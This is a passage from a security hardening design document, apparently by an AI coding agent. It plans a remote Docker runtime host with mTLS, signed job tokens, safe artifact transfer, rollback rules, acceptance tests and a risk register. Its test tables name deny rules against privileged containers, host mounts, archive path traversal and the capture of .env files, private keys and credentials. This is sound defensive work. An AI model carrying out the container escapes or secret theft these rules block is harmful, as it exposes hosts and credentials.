| 2.6 | `runtime_host/` service (FastAPI, mTLS, job model, policy, executor) | No (code only) |
| 2.7 | `runtime_host/Dockerfile` + cert generation script | No |
| 2.8 | `docker-compose.yml`: add runtime_host, remove socket mount from broker | No |
| 2.9 | Unit tests for all new modules | No |
| 2.10 | Integration tests | Yes (BLOCKED in this env) |
| 2.11 | Security acceptance tests (requires separate VM) | Yes (BLOCKED here) |

### 14.2 Rollback Strategy

| Scenario | Action |
|----------|--------|
| Remote runtime host unavailable | Fail closed — `provision()` returns `FAILED`; no direct-docker fallback |
| Rollback to previous version | Use `docker-compose.override.yml` to restore broker service **only in isolated development/staging**; production never restores socket mount |
| Remote runtime host compromised | Isolate runtime host VM; rotate mTLS certs and job-signing keys; issue new tokens |

**Production rollback NEVER restores `/var/run/docker.sock` mount into control-plane services.** The broker fallback exists only for isolated development/staging environments where the shared-host risk is accepted.

---

## 15. Files Likely to Change

### New Files
1. `backend/app/runtime/runtime_host_client.py` — `RemoteRuntimeClient` (mTLS + job tokens)
2. `backend/app/runtime/artifact_transfer.py` — Workspace tarball + SHA-256 verification
3. `backend/app/runtime/job_token.py` — JWT creation/validation for job tokens
4. `backend/app/authz/` — Authorization Component (signing key, token issuance, ownership verification)
5. `runtime_host/` directory (new service on separate VM):
   - `runtime_host/app/main.py` — FastAPI app
   - `runtime_host/app/auth.py` — mTLS + JWT validation
   - `runtime_host/app/policy.py` — Container security policy
   - `runtime_host/app/executor.py` — Docker CLI executor on runtime host
   - `runtime_host/app/schemas.py` — Job request/response schemas
   - `runtime_host/app/jobs.py` — Durable job state store
   - `runtime_host/Dockerfile` — Runtime host image
   - `runtime_host/requirements.txt` — Python dependencies
   - `runtime_host/certs/generate_certs.sh` — mTLS cert generation
6. `docs/operations/RUNTIME_EXECUTION_PLANE.md` — This design doc (living)
7. `tests/unit/test_runtime_host_client.py` — RemoteRuntimeClient unit tests
8. `tests/unit/test_artifact_transfer.py` — Artifact transfer tests
9. `tests/unit/test_job_token.py` — Job token tests
10. `tests/integration/test_runtime_host_isolation.py` — Runtime host isolation tests (blocked without Docker)

### Modified Files
11. `backend/app/runtime/client.py` — Extend `RuntimeClient` ABC with job-oriented methods
12. `backend/app/runtime/mock_client.py` — Update `MockRuntimeClient` to new interface
13. `backend/app/runtime/broker/client.py` — `BrokerClient` adapts to job-oriented interface (backward compat)
14. `backend/app/runtime/docker/orchestrator.py` — Adapt to job-oriented client (submit/poll instead of direct build/run)
15. `backend/app/core/config.py` — Add `RUNTIME_MODE=remote`, mTLS settings, job token settings, artifact settings, authorization component settings
16. `backend/app/services/assessment_pipeline.py` — Pass `tenant_id` to orchestrator (from assessment record)
17. `backend/app/workers/assessment_tasks.py` — `provision_runtime` task passes tenant context
18. `docker-compose.yml` — Add `runtime_host` service; remove socket mount from broker; add mTLS cert volumes
19. `infrastructure/docker/Dockerfile.runtime_host` — New Dockerfile for runtime host
20. `.env.example` — Add runtime host and authorization component environment variables
21. `docs/operations/DOCKER_AND_RUNTIME.md` — Update architecture section
22. `docs/operations/DOCKER_PRIVILEGE_REVIEW.md` — Update risk status

---

## 16. Acceptance Tests

### Testable in This Environment (No Docker Daemon)

| Test | Type | What It Verifies |
|------|------|-----------------|
| `RemoteRuntimeClient` mTLS + job token validation | Unit | Client constructs mTLS context, signs job tokens |
| `RemoteRuntimeClient` fail-closed on unavailable host | Unit | Returns failure when runtime host unreachable |
| `ArtifactTransfer` SHA-256 verification | Unit | Rejects mismatched hash; accepts match |
| `ArtifactTransfer` size limit | Unit | Rejects tarballs > 500 MB compressed, > 2 GB decompressed |
| `ArtifactTransfer` file-count limit | Unit | Rejects archives > 50,000 files |
| `ArtifactTransfer` extraction timeout | Unit | Rejects extractions > 120 seconds |
| `ArtifactTransfer` symlink/hardlink/absolute path/traversal/device/FIFO rejection | Unit | Rejects dangerous archive members |
| `ArtifactTransfer` `.env`/private key/credential/.git exclusion | Unit | Rejects or strips sensitive members |
| `ArtifactTransfer` origin allowlisting | Unit | Rejects non-allowlisted URLs; rejects arbitrary redirects |
| `ArtifactTransfer` no logging of pre-signed URLs | Unit | Logs only job ID + URL hash |
| `JobToken` creation + validation | Unit | Signs/verifies JWT with asymmetric key; checks tenant/assessment/job/operation |
| `JobToken` replay prevention | Unit | Rejects duplicate `jti` |
| `JobToken` cross-tenant rejection | Unit | Rejects token for different `tenant_id` |
| `JobToken` read-only vs mutation separation | Unit | Read tokens cannot submit/cancel; mutation tokens are one-time |
| `RemoteRuntimeClient` marked `[simulated]` | Unit | Never claims live Docker execution |

### Requires Docker Daemon / Separate VM (Blocked in This Environment)

| Test | Type | What It Verifies |
|------|------|-----------------|
| `RemoteRuntimeClient` end-to-end against real runtime host | Integration | Submit/build/run/cleanup over mTLS |
| Runtime host rejects privileged container | Security | `--privileged` rejected |
| Runtime host rejects host mounts | Security | `-v` host paths rejected |
| Runtime host enforces `--internal` network | Security | Container can't reach metadata/LAN |
| Runtime host enforces loopback-only binding | Security | Container port not on `0.0.0.0` |
| Runtime host cleans up on failure | Security | Container/network/image removed after failed build |
| Firewall blocks runtime host → postgres/redis | Security | No network path to control-plane datastores |
| Control plane has no Docker socket mount | Static | `docker-compose.yml` worker/api have no socket volume |
| Build `--network=none` | Integration | No outbound during build `RUN` steps |
| Orphan resource reconciliation | Integration | Orphaned containers cleaned on runtime host restart |

---

## 17. Unresolved Risks & Limitations

| Risk | Severity | Status |
|------|----------|--------|
| Runtime host compromise → host Docker control | High | Accepted (isolated VM); evaluate rootless Docker/gVisor in Phase 3 |
| Control plane → runtime host container reachability | Medium | Firewall restricts published port to control plane IP only |
| Artifact tarball exfiltration | Medium | SHA-256 + size limits + origin allowlisting + path traversal protection |
| Job token theft | Medium | Short TTL (10 min); mTLS + token required; one-time mutation tokens |
| Runtime host nonce cache single point of failure | Low | Per-host cache; replay window limited to TTL |
| gVisor/rootless not evaluated | Low | Documented as unevaluated; not claimed as protection |
| Live Docker isolation verification | BLOCKED | No Docker daemon access in this environment |
| Authorization component availability | Medium | If authz is down, workers cannot obtain tokens; fail closed |

---

## 18. Approval Requested

This is **DESIGN ONLY**. No code has been modified beyond HEAD `8a5430f`.

Please review and approve:
1. Asymmetric job-token signing with authorization component holding private key
2. Mutation vs read-only token separation with idempotency
3. Artifact transfer design (origin allowlisting + SHA-256 + safe tar extraction)
4. Build isolation design (hostile build context assumptions)
5. Network security design (firewall rules + Docker-published port binding)
6. Job lifecycle state machine and orphan reconciliation
7. Rollback strategy (never restore socket mount in production)
8. Redundancy removal (asymmetric keys replace shared secrets)
9. File change list and migration stages

Once approved, I will implement Stage 1 (job-oriented `RuntimeClient` + `RemoteRuntimeClient` + authz component + config) and proceed incrementally.

---

**Git state at time of design:**
- Branch: `fix/security-hardening-audit`
- HEAD: `8a5430f test(security): verify production config guard and cleanup correctness`
- Working tree: Clean
- 12 commits ahead of origin (not pushed)
- `master`: Untouched
